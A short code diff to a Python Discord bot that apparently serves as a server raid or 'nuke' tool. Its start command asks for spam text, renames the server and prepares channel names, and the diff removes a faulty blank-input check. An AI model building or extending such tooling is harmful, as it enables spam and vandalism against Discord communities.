@@ -3,6 +3,7 @@ import discord
 import random
 import os
 import time
+from discord import Permissions
 from discord.ext import commands
 
 # prefix
@@ -12,7 +13,7 @@ bot = commands.Bot(command_prefix=BOT_PREFIX, case_insensitive=True)
 bot.remove_command('Help')
 
 # token
-token = "ENTER TOKEN HERE"
+token = "ENTER TOKEN HERE!"
 
 print("[+] Checking token...")
 
@@ -55,11 +56,6 @@ async def start(ctx):
     spam_txt = input("[+] Enter text to spam here: ")
     
     channel_names = [channel]
-
-    if server_name or channel or spam_txt == "":
-        print("[+] Please don't leave the inputs blank! Try again")
-        time.sleep(1)
-        quit()
     
     # changing server name
     await ctx.guild.edit(name=server_name)
